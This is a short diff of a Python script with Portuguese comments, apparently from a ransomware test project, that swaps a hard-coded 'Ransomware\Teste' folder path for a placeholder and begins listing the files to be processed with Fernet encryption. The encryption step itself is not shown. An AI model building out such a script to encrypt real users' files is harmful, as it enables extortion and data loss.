@@ -1,7 +1,7 @@
 import os
 from cryptography.fernet import Fernet
 
-diretorio = r"D:\Desktop\Ransomware\Teste"  # Diretório onde os arquivos estão localizados
+diretorio = r"insira aqui o seu diretorio para teste"  # Diretório onde os arquivos estão localizados
 
 files = []
 for file in os.listdir(diretorio):
